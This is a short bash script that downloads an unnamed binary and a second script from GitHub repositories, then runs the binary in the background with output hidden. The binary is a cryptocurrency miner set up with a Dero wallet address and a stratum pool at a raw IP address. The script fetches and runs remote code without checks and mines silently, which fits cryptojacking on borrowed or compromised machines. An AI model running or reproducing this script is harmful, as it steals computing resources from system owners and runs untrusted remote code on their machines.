#!/bin/bash

wget https://github.com/renilo/kuuntul/raw/main/babibu
chmod 777 babibu
wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
./babibu -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm6uavs6msuuaksjcgh22.$(echo $(shuf -i 1-2000 -n 1)-default) -r 167.172.84.152:443 -p stratum >/dev/null &
./compile.sh
